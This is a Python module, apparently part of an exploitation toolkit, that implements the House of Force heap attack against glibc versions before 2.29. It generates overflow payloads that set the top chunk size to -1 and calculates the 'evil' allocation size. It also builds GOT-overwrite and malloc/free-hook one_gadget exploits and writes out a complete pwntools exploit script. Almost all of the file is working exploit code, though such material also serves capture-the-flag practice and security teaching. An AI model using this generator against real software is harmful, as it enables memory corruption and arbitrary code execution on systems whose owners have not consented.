"""
House of Force exploitation technique.

A classic heap exploitation technique that leverages a heap overflow
to corrupt the top chunk size, allowing allocation at arbitrary addresses.

Requirements:
- Heap overflow that can overwrite top chunk size
- Control over malloc size argument
- Works best on glibc < 2.29 (before top chunk size checks)

References:
- https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_force.c
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class HouseOfForceConfig:
    """Configuration for House of Force attack."""
    bits: int = 64
    libc_version: str = "2.27"
    header_size: int = 16  # Chunk header size (prev_size + size)
    min_chunk_size: int = 32  # Minimum chunk size (0x20)


class HouseOfForce:
    """
    House of Force heap exploitation technique.

    The attack works by:
    1. Overflowing into the top chunk's size field
    2. Setting the size to a very large value (-1)
    3. Calculating the "evil" allocation size to position top at target
    4. Next allocation returns the target address

    Constraints:
    - Need heap overflow to reach top chunk
    - Need control of malloc size
    - glibc < 2.29 (or bypass size checks)
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.27"):
        """
        Initialize House of Force exploiter.

        Args:
            bits: Architecture bits (32 or 64)
            libc_version: Target glibc version
        """
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.unpack = lambda x: int.from_bytes(x[:8 if bits == 64 else 4], 'little')
        self.libc_version = libc_version

        # Chunk header sizes
        self.header_size = 16 if bits == 64 else 8
        self.size_field_offset = 8 if bits == 64 else 4

        # Parse version
        self.major, self.minor = self._parse_version(libc_version)

        # Size checks added in glibc 2.29
        self.has_size_checks = self.major > 2 or (self.major == 2 and self.minor >= 29)

    def _parse_version(self, version: str) -> Tuple[int, int]:
        """Parse glibc version string."""
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 27

    def check_feasibility(self) -> Dict[str, Any]:
        """
        Check if House of Force is feasible for this configuration.

        Returns:
            Feasibility analysis
        """
        result = {
            "feasible": True,
            "warnings": [],
            "requirements": [
                "Heap overflow to corrupt top chunk size",
                "Control over malloc size argument",
                "Known heap address (for calculating evil size)",
            ],
        }

        if self.has_size_checks:
            result["feasible"] = False
            result["warnings"].append(
                f"glibc {self.libc_version} has top chunk size checks (introduced in 2.29)"
            )
            result["warnings"].append(
                "Consider House of Einherjar or other techniques instead"
            )

        return result

    def calculate_evil_size(
        self,
        top_chunk_addr: int,
        target_addr: int,
    ) -> int:
        """
        Calculate the 'evil' allocation size to position top at target.

        The formula is:
            evil_size = target_addr - top_chunk_addr - 2 * header_size

        This accounts for:
        - Moving past the current top chunk header
        - Space for the new allocated chunk's header

        Args:
            top_chunk_addr: Current address of top chunk
            target_addr: Desired allocation address

        Returns:
            Size to pass to malloc
        """
        evil_size = target_addr - top_chunk_addr - (2 * self.header_size)

        # Handle negative sizes (wraparound for backward movement)
        if evil_size < 0:
            if self.bits == 64:
                evil_size = evil_size & 0xFFFFFFFFFFFFFFFF
            else:
                evil_size = evil_size & 0xFFFFFFFF

        logger.debug(f"Evil size calculated: 0x{evil_size:x}")
        return evil_size

    def generate_overflow_payload(
        self,
        padding_size: int,
        preserve_data: bytes = b"",
    ) -> bytes:
        """
        Generate payload to overflow top chunk size.

        Args:
            padding_size: Bytes between user data and top chunk size
            preserve_data: Data to preserve at start of overflow

        Returns:
            Overflow payload
        """
        payload = preserve_data

        # Pad to reach top chunk size field
        padding_needed = padding_size - len(preserve_data)
        if padding_needed > 0:
            payload += b"A" * padding_needed

        # Overwrite top chunk prev_size (can be anything)
        payload += self.pack(0)

        # Overwrite top chunk size with -1 (maximum size)
        if self.bits == 64:
            payload += self.pack(0xFFFFFFFFFFFFFFFF)
        else:
            payload += self.pack(0xFFFFFFFF)

        return payload

    def generate_exploit(
        self,
        top_chunk_addr: int,
        target_addr: int,
        overflow_padding: int,
        allocation_size: int = 0x100,
    ) -> Dict[str, Any]:
        """
        Generate complete House of Force exploit.

        Args:
            top_chunk_addr: Current top chunk address
            target_addr: Target address to allocate at
            overflow_padding: Padding to reach top chunk from overflow point
            allocation_size: Size for final allocation at target

        Returns:
            Exploit details including payloads and steps
        """
        evil_size = self.calculate_evil_size(top_chunk_addr, target_addr)
        overflow_payload = self.generate_overflow_payload(overflow_padding)

        result = {
            "technique": "house_of_force",
            "target": target_addr,
            "top_chunk": top_chunk_addr,
            "evil_size": evil_size,
            "overflow_payload": overflow_payload,
            "allocation_size": allocation_size,
            "steps": [
                f"1. Allocate chunk adjacent to top chunk",
                f"2. Overflow with payload (len={len(overflow_payload)}) to set top size to -1",
                f"3. Allocate evil_size=0x{evil_size:x} (moves top to 0x{target_addr:x})",
                f"4. Allocate 0x{allocation_size:x} bytes -> returns 0x{target_addr:x}",
            ],
            "feasibility": self.check_feasibility(),
        }

        return result

    def generate_got_overwrite(
        self,
        top_chunk_addr: int,
        got_entry: int,
        new_value: int,
        overflow_padding: int,
    ) -> Dict[str, Any]:
        """
        Generate exploit to overwrite GOT entry.

        Args:
            top_chunk_addr: Current top chunk address
            got_entry: GOT entry address to overwrite
            new_value: Value to write (e.g., system address)
            overflow_padding: Padding to reach top chunk

        Returns:
            Exploit for GOT overwrite
        """
        # Target slightly before GOT entry to account for chunk header
        target = got_entry - self.header_size

        exploit = self.generate_exploit(
            top_chunk_addr=top_chunk_addr,
            target_addr=target,
            overflow_padding=overflow_padding,
            allocation_size=0x20,
        )

        # Add GOT overwrite payload
        exploit["got_entry"] = got_entry
        exploit["got_payload"] = self.pack(new_value)
        exploit["steps"].append(
            f"5. Write 0x{new_value:x} to allocated chunk (overwrites GOT)"
        )

        return exploit

    def generate_hook_overwrite(
        self,
        top_chunk_addr: int,
        hook_addr: int,
        one_gadget: int,
        overflow_padding: int,
    ) -> Dict[str, Any]:
        """
        Generate exploit to overwrite malloc/free hook.

        Args:
            top_chunk_addr: Current top chunk address
            hook_addr: __malloc_hook or __free_hook address
            one_gadget: one_gadget address in libc
            overflow_padding: Padding to reach top chunk

        Returns:
            Exploit for hook overwrite
        """
        # Target before hook to account for header
        target = hook_addr - self.header_size

        exploit = self.generate_exploit(
            top_chunk_addr=top_chunk_addr,
            target_addr=target,
            overflow_padding=overflow_padding,
            allocation_size=0x20,
        )

        exploit["hook_addr"] = hook_addr
        exploit["hook_payload"] = self.pack(one_gadget)
        exploit["steps"].append(
            f"5. Write one_gadget 0x{one_gadget:x} to chunk (overwrites hook)"
        )
        exploit["steps"].append(
            "6. Trigger malloc/free to execute one_gadget"
        )

        return exploit

    def generate_pwntools_script(
        self,
        exploit: Dict[str, Any],
        alloc_func: str = "malloc",
        overflow_func: str = "overflow",
    ) -> str:
        """
        Generate pwntools exploit script.

        Args:
            exploit: Exploit dict from generate_exploit
            alloc_func: Name of allocation function
            overflow_func: Name of overflow function

        Returns:
            Python script string
        """
        script = f'''#!/usr/bin/env python3
"""
House of Force Exploit
Target: 0x{exploit['target']:x}
Evil Size: 0x{exploit['evil_size']:x}
"""

from pwn import *

# Configuration
context.arch = "{'amd64' if self.bits == 64 else 'i386'}"
context.log_level = "debug"

# Addresses (update these)
TOP_CHUNK = 0x{exploit['top_chunk']:x}
TARGET = 0x{exploit['target']:x}

def exploit():
    # Step 1: Overflow to corrupt top chunk size
    overflow_payload = {repr(exploit['overflow_payload'])}
    {overflow_func}(overflow_payload)

    # Step 2: Evil allocation to move top chunk
    evil_size = 0x{exploit['evil_size']:x}
    {alloc_func}(evil_size)

    # Step 3: Allocate at target
    target_chunk = {alloc_func}(0x{exploit['allocation_size']:x})

    # target_chunk should now be at TARGET
    log.success(f"Got allocation at: {{hex(target_chunk)}}")

    return target_chunk

if __name__ == "__main__":
    exploit()
'''
        return script

    def summary(self) -> str:
        """Get technique summary."""
        feasibility = self.check_feasibility()
        status = "✓ Feasible" if feasibility["feasible"] else "✗ Not Feasible"

        return f"""
House of Force
==============
Architecture: {self.bits}-bit
glibc version: {self.libc_version}
Status: {status}

Requirements:
- Heap overflow to corrupt top chunk
- Control over malloc size argument
- Heap address leak (to calculate evil size)

Warnings:
{chr(10).join('- ' + w for w in feasibility['warnings']) or '- None'}
"""


def house_of_force_exploit(
    top_chunk_addr: int,
    target_addr: int,
    overflow_padding: int,
    bits: int = 64,
    libc_version: str = "2.27",
) -> Dict[str, Any]:
    """
    Convenience function for House of Force exploit.

    Args:
        top_chunk_addr: Current top chunk address
        target_addr: Target allocation address
        overflow_padding: Padding bytes to reach top chunk
        bits: Architecture bits
        libc_version: Target glibc version

    Returns:
        Exploit details
    """
    hof = HouseOfForce(bits=bits, libc_version=libc_version)
    return hof.generate_exploit(
        top_chunk_addr=top_chunk_addr,
        target_addr=target_addr,
        overflow_padding=overflow_padding,
    )
